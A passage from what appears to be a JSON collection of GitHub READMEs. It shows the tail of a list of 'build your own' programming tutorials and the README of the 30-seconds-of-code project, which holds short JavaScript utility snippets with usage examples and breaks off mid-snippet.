Than 1000 Lines\nC: Learn how to write a hash table in C\nC: Writing an SVG Library\nC: The very basics of a terminal emulator\nC: Write a System Call\nC: Sol - An MQTT broker from scratch\nC++: Build your own VR headset for $100\nC++: How X Window Managers work and how to write one\nC++: Writing a Linux Debugger\nC++: How a 64k intro is made\nC#: C# Networking: Create a TCP chater server, TCP games, UDP Pong and more\nC#: Loading and rendering 3D skeletal animations from scratch in C# and GLSL\nClojure: Building a spell-checker\nJava: How to Build an Android Reddit App [video]\nJavaScript: Build Your Own Module Bundler - Minipack\nJavaScript: Learn JavaScript Promises by Building a Promise from Scratch\nJavaScript: Implementing promises from scratch (TDD way)\nJavaScript: Implement your own\u200a\u2014\u200acall(), apply() and bind() method in JavaScript\nJavaScript: JavaScript Algorithms and Data Structures\nJavaScript: How to Make an Evolutionary Tetris AI [video]\nJavaScript: Building a Simple URL Shortener With Just HTML and Javascript\nJavaScript: Build a ride hailing app with React Native\nKotlin: Build Your Own Cache\nNim: Writing a Redis Protocol Parser\nNim: Writing a Build system\nNim: Writing a MiniTest Framework\nNim: Writing a DMIDecode Parser\nNim: Writing a INI Parser\nNim: Writing a Link Checker\nNim: Writing a URL Shortening Service\nNode.js: Build a static site generator in 40 lines with Node.js\nNode.js: Building A Simple Single Sign On(SSO) Server And Solution From Scratch In Node.js.\nNode.js: How to create a real-world Node CLI app with Node\nPHP: Write your own MVC from scratch in PHP \nPHP: Make your own blog\nPHP: Modern PHP Without a Framework\nPython: Build a Deep Learning Library [video]\nPython: How to Build a Kick-Ass Mobile Document Scanner in Just 5 Minutes\nPython: Continuous Integration System\nPython: Recommender Systems in Python: Beginner Tutorial\nPython: Write SMS-spam detector with Scikit-learn\nPython: A Simple Content-Based Recommendation Engine in Python\nPython: Stock Market Predictions with LSTM in Python\nPython: Build your own error-correction fountain code with Luby Transform Codes\nPython: Building a simple Generative Adversial Network (GAN) using Tensorflow\nPython: Learn ML Algorithms by coding: Decision Trees\nPython: JSON Decoding Algorithm\nRuby: A Pedometer in the Real World\nRuby: Creating a Linux Desktop application with Ruby\nRust: Let's build a browser engine\nRust: Building a DNS server in Rust\nRust: Writing Scalable Chat Service from Scratch\nTypeScript: Make your own GraphQL metrics dashboard\nTypeScript: Tiny Package Manager: Learns how npm or Yarn works\n\nHow to contribute\n\nContributions are very welcome: Submit tutorial\nHelp me to review pending submissions by leaving comments and \"reactions\"\n\nLicense\n\nTo the extent possible under law, Daniel Stefanovic has waived all copyright and related or neighboring rights to this work."}, {"title": "30-seconds/30-seconds-of-code", "language": "JavaScript", "content": "30 seconds of code\n    \n   \n  \n\nCurated collection of useful JavaScript snippets that you can understand in 30 seconds or less.\n\n\n\nUse Ctrl + F or command + F to search for a snippet.\nContributions welcome, please read the contribution guide.\nSnippets are written in ES6, use the Babel transpiler to ensure backwards-compatibility.\nYou can import these snippets into VSCode, by following the instructions found here.\nYou can search, view and copy these snippets from a terminal, using the CLI application from this repo.\nIf you want to follow 30-seconds-of-code on social media, you can find us on Facebook, Instagram and Twitter.\n\nRelated projects\n\n30 Seconds of CSS\n30 Seconds of Interviews\n30 Seconds of React\n30 Seconds of Python (unofficial)\n30 Seconds of PHP (unofficial)\n30 Seconds of Kotlin (unofficial)\n30 Seconds of Knowledge (unofficial)\n\nPackage\n\u26a0\ufe0f NOTICE: A few of our snippets are not yet optimized for production (see disclaimers for individual snippet issues).\nYou can find a package with all the snippets on npm.\n# With npm\nnpm install 30-seconds-of-code\n\n# With yarn\nyarn add 30-seconds-of-code\nCDN link\n\nDetails\nBrowser\n<script src=\"https://unpkg.com/30-seconds-of-code@1/dist/_30s.es5.min.js\"></script>\n<script>\n  _30s.average(1, 2, 3);\n</script>\nNode\n// CommonJS\nconst _30s = require('30-seconds-of-code');\n_30s.average(1, 2, 3);\n\n// ES Modules\nimport _30s from '30-seconds-of-code';\n_30s.average(1, 2, 3);\n\nContents\n\ud83d\udd0c Adapter\n\nView contents\n\nary\ncall\ncollectInto\nflip\nover\noverArgs\npipeAsyncFunctions\npipeFunctions\npromisify\nrearg\nspreadOver\nunary\n\n\n\ud83d\udcda Array\n\nView contents\n\nall\nallEqual\nany\narrayToCSV\nbifurcate\nbifurcateBy\nchunk\ncompact\ncountBy\ncountOccurrences\ndeepFlatten\ndifference\ndifferenceBy\ndifferenceWith\ndrop\ndropRight\ndropRightWhile\ndropWhile\neveryNth\nfilterFalsy\nfilterNonUnique\nfilterNonUniqueBy\nfindLast\nfindLastIndex\nflatten\nforEachRight\ngroupBy\nhead\nindexOfAll\ninitial\ninitialize2DArray\ninitializeArrayWithRange\ninitializeArrayWithRangeRight\ninitializeArrayWithValues\ninitializeNDArray\nintersection\nintersectionBy\nintersectionWith\nisSorted\njoin\nJSONtoCSV\nlast\nlongestItem\nmapObject\nmaxN\nminN\nnone\nnthElement\noffset\npartition\npermutations\npull\npullAtIndex\npullAtValue\npullBy\nreducedFilter\nreduceSuccessive\nreduceWhich\nreject\nremove\nsample\nsampleSize\nshank\nshuffle\nsimilarity\nsortedIndex\nsortedIndexBy\nsortedLastIndex\nsortedLastIndexBy\nstableSort\nsymmetricDifference\nsymmetricDifferenceBy\nsymmetricDifferenceWith\ntail\ntake\ntakeRight\ntakeRightWhile\ntakeWhile\ntoHash\nunion\nunionBy\nunionWith\nuniqueElements\nuniqueElementsBy\nuniqueElementsByRight\nuniqueSymmetricDifference\nunzip\nunzipWith\nwithout\nxProd\nzip\nzipObject\nzipWith\n\n\n\ud83c\udf10 Browser\n\nView contents\n\narrayToHtmlList\nbottomVisible\ncopyToClipboard\ncounter\ncreateElement\ncreateEventHub\ncurrentURL\ndetectDeviceType\nelementContains\nelementIsVisibleInViewport\nformToObject\ngetImages\ngetScrollPosition\ngetStyle\nhasClass\nhashBrowser\nhide\nhttpsRedirect\ninsertAfter\ninsertBefore\nisBrowserTabFocused\nnodeListToArray\nobserveMutations\noff\non\nonUserInputChange\nprefix\nrecordAnimationFrames\nredirect\nrunAsync\nscrollToTop\nserializeForm\nsetStyle\nshow\nsmoothScroll\ntoggleClass\ntriggerEvent\nUUIDGeneratorBrowser\n\n\n\u23f1\ufe0f Date\n\nView contents\n\ndayOfYear\nformatDuration\ngetColonTimeFromDate\ngetDaysDiffBetweenDates\ngetMeridiemSuffixOfInteger\nisAfterDate\nisBeforeDate\nisSameDate\nmaxDate\nminDate\ntomorrow\n\n\n\ud83c\udf9b\ufe0f Function\n\nView contents\n\nattempt\nbind\nbindKey\nchainAsync\ncheckProp\ncompose\ncomposeRight\nconverge\ncurry\ndebounce\ndefer\ndelay\nfunctionName\nhz\nmemoize\nnegate\nonce\npartial\npartialRight\nrunPromisesInSeries\nsleep\nthrottle\ntimes\nuncurry\nunfold\nwhen\n\n\n\u2797 Math\n\nView contents\n\napproximatelyEqual\naverage\naverageBy\nbinomialCoefficient\nclampNumber\ndegreesToRads\ndigitize\ndistance\nelo\nfactorial\nfibonacci\ngcd\ngeometricProgression\nhammingDistance\ninRange\nisDivisible\nisEven\nisNegativeZero\nisPrime\nlcm\nluhnCheck\nmapNumRange\nmaxBy\nmedian\nmidpoint\nminBy\npercentile\npowerset\nprimes\nradsToDegrees\nrandomIntArrayInRange\nrandomIntegerInRange\nrandomNumberInRange\nround\nsdbm\nstandardDeviation\nsum\nsumBy\nsumPower\ntoSafeInteger\nvectorDistance\n\n\n\ud83d\udce6 Node\n\nView contents\n\natob\nbtoa\ncolorize\ncreateDirIfNotExists\nhasFlags\nhashNode\nisDuplexStream\nisReadableStream\nisStream\nisTravisCI\nisWritableStream\nJSONToFile\nreadFileLines\nuntildify\nUUIDGeneratorNode\n\n\n\ud83d\uddc3\ufe0f Object\n\nView contents\n\nbindAll\ndeepClone\ndeepFreeze\ndeepMapKeys\ndefaults\ndig\nequals\nfindKey\nfindLastKey\nflattenObject\nforOwn\nforOwnRight\nfunctions\nget\ninvertKeyValues\nlowercaseKeys\nmapKeys\nmapValues\nmatches\nmatchesWith\nmerge\nnest\nobjectFromPairs\nobjectToPairs\nomit\nomitBy\norderBy\npick\npickBy\nrenameKeys\nshallowClone\nsize\ntransform\ntruthCheckCollection\nunflattenObject\n\n\n\ud83d\udcdc String\n\nView contents\n\nbyteSize\ncapitalize\ncapitalizeEveryWord\ncompactWhitespace\nCSVToArray\nCSVToJSON\ndecapitalize\nescapeHTML\nescapeRegExp\nfromCamelCase\nindentString\nisAbsoluteURL\nisAnagram\nisLowerCase\nisUpperCase\nmapString\nmask\npad\npalindrome\npluralize\nremoveNonASCII\nreverseString\nsortCharactersInString\nsplitLines\nstringPermutations\nstripHTMLTags\ntoCamelCase\ntoKebabCase\ntoSnakeCase\ntoTitleCase\ntruncateString\nunescapeHTML\nURLJoin\nwords\n\n\n\ud83d\udcc3 Type\n\nView contents\n\ngetType\nis\nisArrayLike\nisBoolean\nisEmpty\nisFunction\nisNil\nisNull\nisNumber\nisObject\nisObjectLike\nisPlainObject\nisPrimitive\nisPromiseLike\nisString\nisSymbol\nisUndefined\nisValidJSON\n\n\n\ud83d\udd27 Utility\n\nView contents\n\ncastArray\ncloneRegExp\ncoalesce\ncoalesceFactory\nextendHex\ngetURLParameters\nhexToRGB\nhttpGet\nhttpPost\nisBrowser\nmostPerformant\nnthArg\nparseCookie\nprettyBytes\nrandomHexColorCode\nRGBToHex\nserializeCookie\ntimeTaken\ntoCurrency\ntoDecimalMark\ntoOrdinalSuffix\nvalidateNumber\nyesNo\n\n\n\n\ud83d\udd0c Adapter\nary\nCreates a function that accepts up to n arguments, ignoring any additional arguments.\nCall the provided function, fn, with up to n arguments, using Array.prototype.slice(0,n) and the spread operator (...).\nconst ary = (fn, n) => (...args) => fn(...args.slice(0, n));\n\nExamples\nconst firstTwoMax = ary(Math.max, 2);\n[[2, 6, 'a'], [8, 4, 6], [10]].map(x => firstTwoMax(...x)); // [6, 8, 10]\n\n\u2b06 Back to top\ncall\nGiven a key and a set of arguments, call them when given a context. Primarily useful in composition.\nUse a closure to call a stored key with stored arguments.\nconst call = (key, ...args) => context => context[key](...args);\n\nExamples\nPromise.resolve([1, 2, 3])\n  .then(call('map', x => 2 * x))\n  .then(console.log); // [ 2, 4, 6 ]\nconst map = call.bind(null, 'map');\nPromise.resolve([1, 2, 3])\n  .then(map(x => 2 * x))\n  .then(console.log); // [ 2, 4, 6 ]\n\n\u2b06 Back to top\ncollectInto\nChanges a function that accepts an array into a variadic function.\nGiven a function, return a closure that collects all inputs into an array-accepting function.\nconst collectInto = fn => (...args) => fn(args);\n\nExamples\nconst Pall = collectInto(Promise.all.bind(Promise));\nlet p1 = Promise.resolve(1);\nlet p2 = Promise.resolve(2);\nlet p3 = new Promise(resolve => setTimeout(resolve, 2000, 3));\nPall(p1, p2, p3).then(console.log); // [1, 2, 3] (after about 2 seconds)\n\n\u2b06 Back to top\nflip\nFlip takes a function as an argument, then makes the first argument the last.\nReturn a closure that takes variadic inputs, and splices the last argument to make it the first argument before applying the rest.\nconst flip = fn => (first, ...rest) => fn(...rest, first);\n\nExamples\nlet a = { name: 'John Smith' };\nlet b = {};\nconst mergeFrom = flip(Object.assign);\nlet mergePerson = mergeFrom.bind(null, a);\nmergePerson(b); // == b\nb = {};\nObject.assign(b, a); // == b\n\n\u2b06 Back to top\nover\nCreates a function that invokes each provided function with the arguments it receives and returns the results.\nUse Array.prototype.map() and Function.prototype.apply() to apply each function to the given arguments.\nconst over = (...fns) => (...args) => fns.map(fn => fn.apply(null, args));\n\nExamples\nconst minMax = over(Math.min, Math.max);\nminMax(1, 2, 3, 4, 5); // [1,5]\n\n\u2b06 Back to top\noverArgs\nCreates a function that invokes the provided function with its arguments transformed.\nUse Array.prototype.map() to apply transforms to args in combination with the spread operator (...) to pass the transformed arguments to fn.\nconst overArgs = (fn, transforms) => (...args) => fn(...args.map((val, i) => transforms[i](val)));\n\nExamples\nconst square = n => n * n;\nconst double = n => n * 2;\nconst fn = overArgs((x, y) => [x, y], [square, double]);\nfn(9, 3); // [81, 6]\n\n\u2b06 Back to top\npipeAsyncFunctions\nPerforms left-to-right function composition for asynchronous functions.\nUse Array.prototype.reduce() with the spread operator (...) to perform left-to-right function composition using Promise.then().\nThe functions can return a combination of: simple values, Promise's, or they can be defined as async ones returning through await.\nAll functions must be unary.\nconst pipeAsyncFunctions = (...fns) => arg => fns.reduce((p, f) => p.then(f), Promise.resolve(arg));\n\nExamples\nconst sum = pipeAsyncFunctions(\n  x => x + 1,\n  x => new Promise(resolve => setTimeout(() => resolve(x + 2), 1000)),\n  x => x + 3,\n  async x => (await x) + 4\n);\n(async() => {\n  console.log(await sum(5)); // 15 (after one second)\n})();\n\n\u2b06 Back to top\npipeFunctions\nPerforms left-to-right function composition.\nUse Array.prototype.reduce() with the spread operator (...) to perform left-to-right function composition.\nThe first (leftmost) function can accept one or more arguments; the remaining functions must be unary.\nconst pipeFunctions = (...fns) => fns.reduce((f, g) => (...args) => g(f(...args)));\n\nExamples\nconst add5 = x => x + 5;\nconst multiply = (x, y) => x * y;\nconst multiplyAndAdd5 = pipeFunctions(multiply, add5);\nmultiplyAndAdd5(5, 2); // 15\n\n\u2b06 Back to top\npromisify\nConverts an asynchronous function to return a promise.\nUse currying to return a function returning a Promise that calls the original function.\nUse the ...rest operator to pass in all the parameters.\nIn Node 8+, you can use util.promisify\nconst promisify = func => (...args) =>\n  new Promise((resolve, reject) =>\n    func(...args, (err, result) => (err ? reject(err) : resolve(result)))\n  );\n\nExamples\nconst delay = promisify((d, cb) => setTimeout(cb, d));\ndelay(2000).then(() => console.log('Hi!')); // // Promise resolves after 2s\n\n\u2b06 Back to top\nrearg\nCreates a function that invokes the provided function with its arguments arranged according to the specified indexes.\nUse Array.prototype.map() to reorder arguments based on indexes in combination with the spread operator (...) to pass the transformed arguments to fn.\nconst rearg = (fn, indexes) => (...args) => fn(...indexes.map(i => args[i]));\n\nExamples\nvar rearged = rearg(\n  function(a, b, c) {\n    return [a, b, c];\n  },\n  [2, 0, 1]\n);\nrearged('b', 'c', 'a'); // ['a', 'b', 'c']\n\n\u2b06 Back to top\nspreadOver\nTakes a variadic function and returns a closure that accepts an array of arguments to map to the inputs of the function.\nUse closures and the spread operator (...) to map the array of arguments to the inputs of the function.\nconst spreadOver = fn => argsArr => fn(...argsArr);\n\nExamples\nconst arrayMax = spreadOver(Math.max);\narrayMax([1, 2, 3]); // 3\n\n\u2b06 Back to top\nunary\nCreates a function that accepts up to one argument, ignoring any additional arguments.\nCall the provided function, fn, with just the first argument given.\nconst unary = fn => val => fn(val);\n\nExamples\n['6', '8', '10'].map(unary(parseInt)); // [6, 8, 10]\n\n\u2b06 Back to top\n\n\ud83d\udcda Array\nall\nReturns true if the provided predicate function returns true for all elements in a collection, false otherwise.\nUse Array.prototype.every() to test if all elements in the collection return true based on fn.\nOmit the second argument, fn, to use Boolean as a default.\nconst all = (arr, fn = Boolean) => arr.every(fn);\n\nExamples\nall([4, 2, 3], x => x > 1); // true\nall([1, 2, 3]); // true\n\n\u2b06 Back to top\nallEqual\nCheck if all elements in an array are equal.\nUse Array.prototype.every() to check if all the elements of the array are the same as the first one.\nconst allEqual = arr => arr.every(val => val === arr[0]);\n\nExamples\nallEqual([1, 2, 3, 4, 5, 6]); // false\nallEqual([1, 1, 1, 1]); // true\n\n\u2b06 Back to top\nany\nReturns true if the provided predicate function returns true for at least one element in a collection, false otherwise.\nUse Array.prototype.some() to test if any elements in the collection return true based on fn.\nOmit the second argument, fn, to use Boolean as a default.\nconst any = (arr, fn = Boolean) => arr.some(fn);\n\nExamples\nany([0, 1, 2, 0], x => x >= 2); // true\nany([0, 0, 1, 0]); // true\n\n\u2b06 Back to top\narrayToCSV\nConverts a 2D array to a comma-separated values (CSV) string.\nUse Array.prototype.map() and Array.prototype.join(delimiter) to combine individual 1D arrays (rows) into strings.\nUse Array.prototype.join('\\n') to combine all rows into a CSV string, separating each row with a newline.\nOmit the second argument, delimiter, to use a default delimiter of ,.\nconst arrayToCSV = (arr, delimiter = ',') =>\n  arr\n    .map(v => v.map(x => (isNaN(x) ? `\"${x.replace(/\"/g, '\"\"')}\"` : x)).join(delimiter))\n    .join('\\n');\n\nExamples\narrayToCSV([['a', 'b'], ['c', 'd']]); // '\"a\",\"b\"\\n\"c\",\"d\"'\narrayToCSV([['a', 'b'], ['c', 'd']], ';'); // '\"a\";\"b\"\\n\"c\";\"d\"'\narrayToCSV([['a', '\"b\" great'], ['c', 3.1415]]); // '\"a\",\"\"\"b\"\" great\"\\n\"c\",3.1415'\n\n\u2b06 Back to top\nbifurcate\nSplits values into two groups. If an element in filter is truthy, the corresponding element in the collection belongs to the first group; otherwise, it belongs to the second group.\nUse Array.prototype.reduce() and Array.prototype.push() to add elements to groups, based on filter.\nconst bifurcate = (arr, filter) =>\n  arr.reduce((acc, val, i) => (acc[filter[i] ? 0 : 1].push(val), acc), [[], []]);\n\nExamples\nbifurcate(['beep', 'boop', 'foo', 'bar'], [true, true, false, true]); // [ ['beep', 'boop', 'bar'], ['foo'] ]\n\n\u2b06 Back to top\nbifurcateBy\nSplits values into two groups according to a predicate function, which specifies which group an element in the input collection belongs to. If the predicate function returns a truthy value, the collection element belongs to the first group; otherwise, it belongs to the second group.\nUse Array.prototype.reduce() and Array.prototype.push() to add elements to groups, based on the value returned by fn for each element.\nconst bifurcateBy = (arr, fn) =>\n  arr.reduce((acc, val, i) => (acc[fn(val, i) ? 0 : 1].push(val), acc), [[], []]);\n\nExamples\nbifurcateBy(['beep', 'boop', 'foo', 'bar'], x => x[0] === 'b'); // [ ['beep', 'boop', 'bar'], ['foo'] ]\n\n\u2b06 Back to top\nchunk\nChunks an array into smaller arrays of a specified size.\nUse Array.from() to create a new array, that fits the number of chunks that will be produced.\nUse Array.prototype.slice() to map each element of the new array to a chunk the length of size.\nIf the original array can't be split evenly, the final chunk will contain the remaining elements.\nconst chunk = (arr, size) =>\n  Array.from({ length: Math.ceil(arr.length / size) }, (v, i) =>\n    arr.slice(i * size, i * size + size)\n  );\n\nExamples\nchunk([1, 2, 3, 4, 5], 2); // [[1,2],[3,4],[5]]\n\n\u2b06 Back to top\ncompact\nRemoves falsey values from an array.\nUse Array.prototype.filter() to filter out falsey values (false, null, 0, \"\", undefined, and NaN).\nconst compact = arr => arr.filter(Boolean);\n\nExamples\ncompact([0, 1, false, 2, '', 3, 'a', 'e' * 23, NaN, 's', 34]); // [ 1, 2, 3, 'a', 's', 34 ]\n\n\u2b06 Back to top\ncountBy\nGroups the elements of an array based on the given function and returns the count of elements in each group.\nUse Array.prototype.map() to map the values of an array to a function or property name.\nUse Array.prototype.reduce() to create an object, where the keys are produced from the mapped results.\nconst countBy = (arr, fn) =>\n  arr.map(typeof fn === 'function' ? fn : val => val[fn]).reduce((acc, val) => {\n    acc[val] = (acc[val] || 0) + 1;\n    return acc;\n  }, {});\n\nExamples\ncountBy([6.1, 4.2, 6.3], Math.floor); // {4: 1, 6: 2}\ncountBy(['one', 'two', 'three'], 'length'); // {3: 2, 5: 1}\n\n\u2b06 Back to top\ncountOccurrences\nCounts the occurrences of a value in an array.\nUse Array.prototype.reduce() to increment a counter each time you encounter the specific value inside the array.\nconst countOccurrences = (arr, val) => arr.reduce((a, v) => (v === val ? a + 1 : a), 0);\n\nExamples\ncountOccurrences([1, 1, 2, 1, 2, 3], 1); // 3\n\n\u2b06 Back to top\ndeepFlatten\nDeep flattens an array.\nUse recursion.\nUse Array.prototype.concat() with an empty array ([]) and the spread operator (...) to flatten an array.\nRecursively flatten each element that is an array.\nconst deepFlatten = arr => [].concat(...arr.map(v => (Array.isArray(v) ? deepFlatten(v) : v)));\n\nExamples\ndeepFlatten([1, [2], [[3], 4], 5]); // [1,2,3,4,5]\n\n\u2b06 Back to top\ndifference\nReturns the difference between two arrays.\nCreate a Set from b, then use Array.prototype.filter() on a to only keep values not contained in b.\nconst difference = (a, b) => {\n  const s = new Set(b);\n  return a.filter(x => !s.has(x));\n};\n\nExamples\ndifference([1, 2, 3], [1, 2, 4]); // [3]\n\n\u2b06 Back to top\ndifferenceBy\nReturns the difference between two arrays, after applying the provided function to each array element of both.\nCreate a Set by applying fn to each element in b, then use Array.prototype.map() to apply fn to each element in a, then Array.prototype.filter()\nconst differenceBy = (a, b, fn) => {\n  const s = new Set(b.map(fn));\n  return a.map(fn).filter(el => !s.has(el));\n};\n\nExamples\ndifferenceBy([2.1, 1.2], [2.3, 3.4], Math.floor); // [1]\ndifferenceBy([{ x: 2 }, { x: 1 }], [{ x: 1 }], v => v.x); // [2]\n\n\u2b06 Back to top\ndifferenceWith\nFilters out all values from an array for which the comparator function does not return true.\nUse Array.prototype.filter() and Array.prototype.findIndex() to find the appropriate values.\nconst differenceWith = (arr, val, comp) => arr.filter(a => val.findIndex(b => comp(a, b)) === -1);\n\nExamples\ndifferenceWith([1, 1.2, 1.5, 3, 0], [1.9, 3, 0], (a, b) => Math.round(a) === Math.round(b)); // [1, 1.2]\n\n\u2b06 Back to top\ndrop\nReturns a new array with n elements removed from the left.\nUse Array.prototype.slice() to remove the specified number of elements from the left.\nconst drop = (arr, n = 1) => arr.slice(n);\n\nExamples\ndrop([1, 2, 3]); // [2,3]\ndrop([1, 2, 3], 2); // [3]\ndrop([1, 2, 3], 42); // []\n\n\u2b06 Back to top\ndropRight\nReturns a new array with n elements removed from the right.\nUse Array.prototype.slice() to remove the specified number of elements from the right.\nconst dropRight = (arr, n = 1) => arr.slice(0, -n);\n\nExamples\ndropRight([1, 2, 3]); // [1,2]\ndropRight([1, 2, 3], 2); // [1]\ndropRight([1, 2, 3], 42); // []\n\n\u2b06 Back to top\ndropRightWhile\nRemoves elements from the end of an array until the passed function returns true. Returns the remaining elements in the array.\nLoop through the array, using Array.prototype.slice() to drop the last element of the array until the returned value from the function is true.\nReturns the remaining elements.\nconst dropRightWhile = (arr, func) => {\n  while (arr.length > 0 && !func(arr[arr.length - 1])) arr = arr.slice(0, -1);\n  return arr;\n};\n\nExamples\ndropRightWhile([1, 2, 3, 4], n => n < 3); // [1, 2]\n\n\u2b06 Back to top\ndropWhile\nRemoves elements in an array until the passed function returns true. Returns the remaining elements in the array.\nLoop through the array, using Array.prototype.slice() to drop the first element of the array until the returned value from the function is true.\nReturns the remaining elements.\nconst dropWhile = (arr, func) => {\n  while (arr.length > 0 && !func(arr[0])) arr = arr.slice(1);\n  return arr;\n};\n\nExamples\ndropWhile([1, 2, 3, 4], n => n >= 3); // [3,4]\n\n\u2b06 Back to top\neveryNth\nReturns every nth element in an array.\nUse Array.prototype.filter() to create a new array that contains every nth element of a given array.\nconst everyNth = (arr, nth) => arr.filter((e, i) => i % nth === nth - 1);\n\nExamples\neveryNth([1, 2, 3, 4, 5, 6], 2); // [ 2, 4, 6 ]\n\n\u2b06 Back to top\nfilterFalsy\nFilters out the falsy values in an array.\nUse Array.prototype.filter() to get an array containing only truthy values.\nconst filterFalsy = arr => arr.filter(Boolean);\n\nExamples\nfilterFalsy(['', true, {}, false, 'sample', 1, 0]); // [true, {}, 'sample', 1]\n\n\u2b06 Back to top\nfilterNonUnique\nFilters out the non-unique values in an array.\nUse Array.prototype.filter() for an array containing only the unique values.\nconst filterNonUnique = arr => arr.filter(i => arr.indexOf(i) === arr.lastIndexOf(i));\n\nExamples\nfilterNonUnique([1, 2, 2, 3, 4, 4, 5]); // [1, 3, 5]\n\n\u2b06 Back to top\nfilterNonUniqueBy\nFilters out the non-unique values in an array, based on a provided comparator function.\nUse Array.prototype.filter() and Array.prototype.every() for an array containing only the unique values, based on the comparator function, fn.\nThe comparator function takes four arguments: the values of the two elements being compared and their indexes.\nconst filterNonUniqueBy = (arr, fn) =>\n  arr.filter((v, i) => arr.every((x, j) => (i === j) === fn(v, x, i, j)));\n\nExamples\nfilterNonUniqueBy(\n  [\n    { id: 0, value: 'a' },\n    { id: 1, value: 'b' },\n    { id: 2, value: 'c' },\n    { id: 1, value: 'd' },\n    { id: 0, value: 'e' }\n  ],\n  (a, b) => a.id == b.id\n); // [ { id: 2, value: 'c' } ]\n\n\u2b06 Back to top\nfindLast\nReturns the last element for which the provided function returns a truthy value.\nUse Array.prototype.filter() to remove elements for which fn returns falsey values, Array.prototype.pop() to get the last one.\nconst findLast = (arr, fn) => arr.filter(fn).pop();\n\nExamples\nfindLast([1, 2, 3, 4], n => n % 2 === 1); // 3\n\n\u2b06 Back to top\nfindLastIndex\nReturns the index of the last element for which the provided function returns a truthy value.\nUse Array.prototype.map() to map each element to an array with its index and value.\nUse Array.prototype.filter() to remove elements for which fn returns falsey values, Array.prototype.pop() to get the last one.\nconst findLastIndex = (arr, fn) =>\n  arr\n    .map((val, i) => [i, val])\n    .filter(([i, val]) => fn(val, i, arr))\n    .pop()[0];\n\nExamples\nfindLastIndex([1, 2, 3, 4], n => n % 2 === 1); // 2 (index of the value 3)\n\n\u2b06 Back to top\nflatten\nFlattens an array up to the specified depth.\nUse recursion, decrementing depth by 1 for each level of depth.\nUse Array.prototype.reduce() and Array.prototype.concat() to merge elements or arrays.\nBase case, for depth equal to 1 stops recursion.\nOmit the second argument, depth to flatten only to a depth of 1 (single flatten).\nconst flatten = (arr, depth = 1) =>\n  arr.reduce((a, v) => a.concat(depth > 1 && Array.isArray(v) ? flatten(v, depth - 1) : v), []);\n\nExamples\nflatten([1, [2], 3, 4]); // [1, 2, 3, 4]\nflatten([1, [2, [3, [4, 5], 6], 7], 8], 2); // [1, 2, 3, [4, 5], 6, 7, 8]\n\n\u2b06 Back to top\nforEachRight\nExecutes a provided function once for each array element, starting from the array's last element.\nUse Array.prototype.slice(0) to clone the given array, Array.prototype.reverse() to reverse it and Array.prototype.forEach() to iterate over the reversed array.\nconst forEachRight = (arr, callback) =>\n  arr\n    .slice(0)\n    .reverse()\n    .forEach(callback);\n\nExamples\nforEachRight([1, 2, 3, 4], val => console.log(val)); // '4', '3', '2', '1'\n\n\u2b06 Back to top\ngroupBy\nGroups the elements of an array based on the given function.\nUse Array.prototype.map() to map the values of an array to a function or property name.\nUse Array.prototype.reduce() to create an object, where the keys are produced from the mapped results.\nconst groupBy = (arr, fn) =>\n  arr.map(typeof fn === 'function' ? fn : val => val[fn]).reduce((acc, val, i) => {\n    acc[val] = (acc[val] || []).concat(arr[i]);\n    return acc;\n  }, {});\n\nExamples\ngroupBy([6.1, 4.2, 6.3], Math.floor); // {4: [4.2], 6: [6.1, 6.3]}\ngroupBy(['one', 'two', 'three'], 'length'); // {3: ['one', 'two'], 5: ['three']}\n\n\u2b06 Back to top\nhead\nReturns the head of a list.\nUse arr[0] to return the first element of the passed array.\nconst head = arr => arr[0];\n\nExamples\nhead([1, 2, 3]); // 1\n\n\u2b06 Back to top\nindexOfAll\nReturns all indices of val in an array.\nIf val never occurs, returns [].\nUse Array.prototype.reduce() to loop over elements and store indices for matching elements.\nReturn the array of indices.\nconst indexOfAll = (arr, val) => arr.reduce((acc, el, i) => (el === val ? [...acc, i] : acc), []);\n\nExamples\nindexOfAll([1, 2, 3, 1, 2, 3], 1); // [0,3]\nindexOfAll([1, 2, 3], 4); // []\n\n\u2b06 Back to top\ninitial\nReturns all the elements of an array except the last one.\nUse arr.slice(0,-1) to return all but the last element of the array.\nconst initial = arr => arr.slice(0, -1);\n\nExamples\ninitial([1, 2, 3]); // [1,2]\n\n\u2b06 Back to top\ninitialize2DArray\nInitializes a 2D array of given width and height and value.\nUse Array.prototype.map() to generate h rows where each is a new array of size w initialize with value. If the value is not provided, default to null.\nconst initialize2DArray = (w, h, val = null) =>\n  Array.from({ length: h }).map(() => Array.from({ length: w }).fill(val));\n\nExamples\ninitialize2DArray(2, 2, 0); // [[0,0], [0,0]]\n\n\u2b06 Back to top\ninitializeArrayWithRange\nInitializes an array containing the numbers in the specified range where start and end are inclusive with their common difference step.\nUse Array.from() to create an array of the desired length, (end - start + 1)/step, and a map function to fill it with the desired values in the given range.\nYou can omit start to use a default value of 0.\nYou can omit step to use a default value of 1.\nconst initializeArrayWithRange = (end, start = 0, step = 1) =>\n  Array.from({ length: Math.ceil((end - start + 1) / step) }, (v, i) => i * step + start);\n\nExamples\ninitializeArrayWithRange(5); // [0,1,2,3,4,5]\ninitializeArrayWithRange(7, 3); // [3,4,5,6,7]\ninitializeArrayWithRange(9, 0, 2); // [0,2,4,6,8]\n\n\u2b06 Back to top\ninitializeArrayWithRangeRight\nInitializes an array containing the numbers in the specified range (in reverse) where start and end are inclusive with their common difference step.\nUse Array.from(Math.ceil((end+1-start)/step)) to create an array of the desired length(the amounts of elements is equal to (end-start)/step or (end+1-start)/step for inclusive end), Array.prototype.map() to fill with the desired values in a range.\nYou can omit start to use a default value of 0.\nYou can omit step to use a default value of 1.\nconst initializeArrayWithRangeRight = (end, start = 0, step = 1) =>\n  Array.from({ length: Math.ceil((end + 1 - start) / step) }).map(\n    (v, i, arr) => (arr.length - i - 1) * step + start\n  );\n\nExamples\ninitializeArrayWithRangeRight(5); // [5,4,3,2,1,0]\ninitializeArrayWithRangeRight(7, 3); // [7,6,5,4,3]\ninitializeArrayWithRangeRight(9, 0, 2); // [8,6,4,2,0]\n\n\u2b06 Back to top\ninitializeArrayWithValues\nInitializes and fills an array with the specified values.\nUse Array(n) to create an array of the desired length, fill(v) to fill it with the desired values.\nYou can omit val to use a default value of 0.\nconst initializeArrayWithValues = (n, val = 0) => Array(n).fill(val);\n\nExamples\ninitializeArrayWithValues(5, 2); // [2, 2, 2, 2, 2]\n\n\u2b06 Back to top\ninitializeNDArray\nCreate a n-dimensional array with given value.\nUse recursion.\nUse Array.prototype.map() to generate rows where each is a new array initialized using initializeNDArray.\nconst initializeNDArray = (val, ...args) =>\n  args.length === 0\n    ? val\n    : Array.from({ length: args[0] }).map(() => initializeNDArray(val, 